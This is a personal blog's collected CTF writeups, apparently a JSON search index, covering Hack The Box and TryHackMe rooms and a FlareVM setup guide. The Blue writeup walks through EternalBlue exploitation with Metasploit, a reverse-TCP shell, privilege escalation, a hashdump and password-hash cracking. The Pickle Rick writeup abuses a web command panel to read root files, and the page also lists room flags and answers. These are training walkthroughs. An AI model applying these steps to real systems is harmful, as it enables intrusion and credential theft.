[[{"l":"Home","p":["Personal IT blog that provides detailed writeups on TryHackMe and Hack The Box challenges. Documenting my learning path in Cyber Security and tech industry with the hope to inspire others."]}],[{"l":"Hack The Box","p":["Rooms:","Name","Category","Difficulty","Behind the Scenes","Reversing","Very Easy"]}],[{"l":"Behind the Scenes","p":["After struggling to secure our secret strings for a long time, we finally figured out the solution to our problem: Make decompilation harder. It should now be impossible to figure out how our programs work!"]},{"l":"Writeup","p":["Start by downloading the file Behind the Scenes.zip from the HackTheBox challenge onto your Kali Linux guest system. The first thing we do is running the code and see what happens.","We can determine it expects us to pass through a password argument. The next step is to verify what information the strings command reveals.","Now we learned the flag should be HTB{%s} where the value for %s is still unknown. Let's see if ltrace gives us more insights.","We receive a SIGILL, which is a signal that the program tried to execute an illegal instruction. I'd like to see the program in hexeditor to reveal more information.","Let's search in the hexeditor by pressing CTRL+ W and search for text string challenge, the argument we found in the first step. It looks like this reveals our password and HackTheBox flag.","HTB{Itz_0nLy_UD2}","Congratiulations, you've completed the room."]}],[{"l":"TryHackMe","p":["Rooms:","Name","Category","Difficulty","Blue","Exploit","Easy","Dig Dug","DNS","Very Easy","Pickle Rick","Web Fundamentals","Web"]}],[{"l":"Blue","p":["Deploy & hack into a Windows machine, leveraging common misconfigurations issues. The Blue CTF is an easy box based on the EternalBlue vulnerability CVE-2017-0143. As preparation for this room, I recommend following the Windows Exploration Basics path to get familair with the commands:","Windows Fundamentals 1 Windows Fundamentals 2 Active Directory Basics Metasploit: Introduction Metasploit: Exploitation Metasploit: Meterpreter"]},{"l":"Writeup"},{"l":"Reconnaissance","p":["How many ports are open with a port number under 1000?","To answer this question I used nmap to scan for open ports and vulnerabilities.","-sV enumerate versions","-p 1-999 scan all ports under 1000","--script vuln argument to scan vulnerabilities","3","What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)","Review the nmap output for the answer to this question.","ms17-010"]},{"l":"Gain Access","p":["Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)","Start Metasploit with the msfconsole command in your terminal. Once Metasploit Framework is initialized, we can search the vulnaribility with command: search ms17-010.","In this case I'm interested in the EternalBlue exploit. Use the command use 0 to select the exploit. You can also use the full name of the exploit with command use exploit/windows/smb/ms17_010_eternalblue.","exploit/windows/smb/ms17_010_eternalblue","Show options and set the one required value. What is the name of this value? (All caps for submission)","After selecting the exploit we can show the module options with the command show options. Analyze the output of this command. There is one required setting that's not predefined.","RHOSTS","Before we run the exploit, we first select a payload and some options. To find your IP address run the ifconfig command and look for the tun0 interface.","set payload windows/x64/shell/reverse_tcp","set RHOSTS SERVER IP ADDRESS","set LHOST YOUR IP ADDRESS","With that done, run the exploit. You can run the exploit with either the run or exploit command.","Exploit is running","The exploit is running successfully if you see the Windows shell: C:\\Windows\\system32."]},{"l":"Privilege Escalation","p":["If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)","Background the shell now with CTRL+ Z.","use post/multi/manage/shell_to_meterpreter","Select this (use MODULE_PATH). Show options, what option are we required to change?","Type in the command use post/multi/manage/shell_to_meterpreter. Now use show options to list the arguments. What option is required but not set?","SESSION","Now type sessions in your terminal. Set the session with command set SESSION SESSION_ID.","Run the post exploit using command run. If it doesn't work the first time, run the exploit again.","This will create a second session. Type in sessions to list them both. Note that session 2 is the meterpreter session.","To get in the meterpreter session use the command sessions SESSION_ID. Now run the getsystem command to verify if we successfully escalated our privileges to NT AUTHORITY\\SYSTEM.","Now run the ps command to list all the running processes on the traget machine.","Running processes on target machine","Migrate a process that is running under NT AUTHORITY\\SYSTEM with the command migrate [pid]. It case it fails, chose another process id."]},{"l":"Cracking","p":["Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?","Run the hashdump command within the meterpreter session.","Jon","Copy this password hash to a file and research how to crack it. What is the cracked password?","Copy the hash ffb43f0de35be4d9917ac0cc8ad57f8d into CrackStation to reveal the password, or use John the Ripper: john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt password.txt. Create a text-file with the hash.","alqfna22"]},{"i":"find-flags","l":"Find Flags!","p":["Background the meterpreter session with command background and start the shell session with command sessions SESSION_ID.","Flag1? This flag can be found at the system root.","Change directory to C:\\ and run the dir command.","Use the command type flag1.txt to print the content of the file to your terminal.","flag{access_the_machine}","Flag2? This flag can be found at the location where passwords are stored within Windows.","The command dir *flag*.* /s will reveal the location of where the flags are stored.","type C:\\Windows\\System32\\config\\flag2.txt","flag{sam_database_elevated_access}","Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.","type C:\\Users\\Jon\\Documents\\flag3.txt","flag{admin_documents_can_be_valuable}","Congratiulations, you've completed the room."]}],[{"l":"Dig Dug","p":["Turns out this machine is a DNS server - it's time to get your shovels out. This is a very easy room to get familiar with DNS requests."]},{"l":"Writeup"},{"i":"retrieve-the-flag-from-the-dns-server","l":"Retrieve the flag from the DNS server!","p":["This task is very simple. Just read the description and thinl clearly. First thing I did whas writing down the given information:","IP_ADDRESS is our DNS server dig is the command we use to gather DNS information givemetheflag.com is the domain name to investigate","Now that we know that, let's put it together in a one-liner:","The @ parameter defines the DNS server we wanna use. This will provide us the information we need. The flag is in a TXT-record:","flag{0767ccd06e79853318f25aeb08ff83e2}","Congratiulations, you've completed the room."]}],[{"l":"Pickle Rick","p":["This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. As preparation for this room, I recommend following the Web Hacking Fundamentals path to get familair with the commands:","How websites work HTTP in detail Burp Suite: The Basics OWASP Top 10 OWASP Juice Shop Upload Vulnerabilities"]},{"l":"Writeup"},{"l":"Enumeration","p":["1 jerry tear","A login page that requires a username and password. We found out about the username, but we don't have a password. First of all, let's check the last file that we found with dirsearch: robots.txt. This file tells search engine crawlers which URL's it may access on a webserver. This file contains a weird word: Wubbalubbadubdub. Could this be our password? Let's try it out on the login page.","Assets","Command disabled","Command panel","Congratiulations, you've completed the room.","First step is to start with enumeration. Let's start with a nmap scan on the IP-address of the webserver: nmap -A 10.10.92.155 -Pn.","First thing I did was checking the files in the assets folder. It contains some images plus .css and .js files. I can't find something useful in here.","fleeb juice","Homepage of the website","I've use the tool dirsearch to scan the webserver: dirsearch -u http://10-10-92-155.p.thmlabs.com/. The tool found some interesting files and directories to work with.","Let's check the contents of the folder rick. Change the command to cd /home/rick ls and execute it. Cool, there is a file called second ingredients. Let's open it with the less /home/rick/'second ingredients' command. There is our second flag.","Let's try the command cat Sup3rS3cretPickl3Ingred.txt to see if we can read the contents of the file. The command is disabled.","mr. meeseek hair","No useful data visible on the homepage. What if we view the page source?","Page source of the website","Password: Wubbalubbadubdub","Portal login page","Remember there was a second file called clue.txt. Let's find out if it can lead us to other flags. Type in less clue.txt.","So we can find the other flags by looking around in the file system. First I'm gonna check if there is a home folder. To combine command I'm gonna use the operator, since the portal page changes back to the webroot after every executed command. The first command I used is cd /home ls. The output shows me there are 2 homefolders:","The index.html file is the default homepage. Next is a login.php file which is the most interesting file. Let's open this in our browser to see what is does:","The nmap scan gives us some information. There are 2 open ports: 22 (SSH) and 80 (HTTP). The webserver runs on Apache 2.4.18. Let's open the webpage in our browser to investigate it a little more.","There is a file called 3rd.txt that might be interesting. Let's read the contents with command sudo less /root/3rd.txt. This file contains our last flag.","Username: R1ckRul3s","We have another utility in Linux to read file contents, let's try the less command: less Sup3rS3cretPickl3Ingred.txt. That command isn't blocked. We found our first flag.","We see the developer made a HTML comment between the !-- -- tags. Now we know the username, but how can we use it? The homepage looks like a static webpage without a login form. Let's dig in a little further.","We're in and have been redirected to portal.php. Type in ls to list all files and directories. I see 2 interesting files: Sup3rS3cretPickl3Ingred.txt and clue.txt.","What is the first ingredient Rick needs?","What other files can I find on the file system? Let's see if I'm able to run sudo with the command sudo -l.","Whats the final ingredient Rick needs?","Whats the second ingredient Rick needs?","Yes, I can. Now that I've confirmed I can run sudo, I'm able to access the root directory. I can list the contents with command sudo ls -la /root."]}],[{"l":"Web Fundamentals","p":["Learn about how you request content from a web server using the HTTP protocol. This is a very easy room explaining how the world wide web works. Check the video from TryHackMe for a very detailed walkthrough."]},{"l":"Writeup"},{"i":"task-1-what-is-https","l":"Task 1: What is HTTP(S)?","p":["What does HTTP stand for?","HyperText Transfer Protocol","What does the S in HTTPS stand for?","Secure","On the mock webpage on the right there is an issue, once you've found it, click on it. What is the challenge flag?","Click on the lock to examine the SSL certificate. It will pop-up the first flag.","Examine the SSL certificate","THM{INVALID_HTTP_CERT}"]},{"i":"task-2-requests-and-responses","l":"Task 2: Requests And Responses","p":["What HTTP protocol is being used in the above example?","HTTP/1.1","What response header tells the browser how much data to expect?","Content-Length"]},{"i":"task-3-http-methods","l":"Task 3: HTTP Methods","p":["What method would be used to create a new user account?","POST","What method would be used to update your email address?","PUT","What method would be used to remove a picture you've uploaded to your account?","DELETE","What method would be used to view a news article?","GET"]},{"i":"task-4-http-status-codes","l":"Task 4: HTTP Status Codes","p":["What response code might you receive if you've created a new user or blog post article?","201","What response code might you receive if you've tried to access a page that doesn't exist?","404","What response code might you receive if the web server cannot access its database and the application crashes?","503","What response code might you receive if you try to edit your profile without logging in first?","401"]},{"i":"task-5-headers","l":"Task 5: Headers","p":["What header tells the web server what browser is being used?","User-Agent","What header tells the browser what type of data is being returned?","Content-Type","What header tells the web server which website is being requested?","Host"]},{"i":"task-6-cookies","l":"Task 6: Cookies","p":["Which header is used to save cookies to your computer?","Set-Cookie"]},{"i":"task-7-making-requests","l":"Task 7: Making Requests","p":["Change the method to DELETE and the URL to /user/1. Flag will be displayed in the response.","Change the method to GET and the URL to /blog. Change the parameter id to 1. Flag will be displayed in the response.","Change the method to GET and the URL to /room. Flag will be displayed in the response.","Change the method to POST and the URL to /login. Change the parameter username to thm, and the parameter password to letmein. Flag will be displayed in the response.","Change the method to PUT and the URL to /user/2. Change the parameter username to admin. Flag will be displayed in the response.","Congratiulations, you've completed the room.","DELETE request","GET request","GET request with parameter","Make a DELETE request to /user/1","Make a GET request to /blog and using the gear icon set the id parameter to 1 in the URL field","Make a GET request to /room","Make a PUT request to /user/2 with the username parameter set to admin","POST request","POST the username of thm and a password of letmein to /login","PUT request","THM{HTTP_REQUEST_MASTER}","THM{USER_HAS_UPDATED}","THM{USER_IS_DELETED}","THM{YOU_FOUND_THE_BLOG}","THM{YOU'RE_IN_THE_ROOM}"]}],[{"l":"FlareVM","p":["FlareVM is a reverse engineering and malware analysis distribution on Windows platform created by Mandiant. It includes a lot of tools for security researchers. In this post I'll explain how to install a FlareVM on a clean Windows 11 installation."]},{"l":"Installation"},{"l":"Requirements","p":["60 GB Hard Drive","2 GB RAM"]},{"l":"Windows 11 Installation"},{"l":"Pre-installation","p":["Make sure a clean Windows 11 VM is already installed","Disable Windows Defender","Make sure the following settings are configured:","Disable real-time protection","Disable cloud-delivered protection","Disable automatic sample submission","Add the directory C:\\ to the exclusion list","Take a snapshot of your VM"]},{"i":"installation-1","l":"Installation","p":["Download and copy install.ps1 onto your new VM","Open PowerShell as an Administrator","Unblock the install file by running:","Unblock-File .\\install.ps1","Enable script execution by running:","Set-ExecutionPolicy Unrestricted","Finally, execute the installer script as follow:",".\\install.ps1","You can also pass your password as an argument: .\\install.ps1 -password password"]},{"l":"Post-installation","p":["If the background was not successfully set:","Navigate to %PROGRAMDATA%\\chocolatey\\lib\\flarevm.win10.config.flare\\tools and right click flarevm.png","Right click flarevm.png and select Set as desktop background","Take a post-installation snapshot","Don't forget to update your VM's network settings to Host-Only so that vulnerable programs cannot hop to your host system.","Mandiant FlareVM GitHub"]},{"l":"Updates","p":["In order to install updates, make sure you update your VM's network settings to NAT to restore your internet connection.","You can customize your distribution by installing additional packages. For an overview of all available packages, check the repository on Chocolatey. For example, to install Google Chrome, use the following command:","It's also important to keep your distribution up-to-date. Use the following command to update your installed packages:"]}],[{"l":"LaTeX","p":["Rooms:","Name","Category","Difficulty","Test","Exploit","Easy"]}]]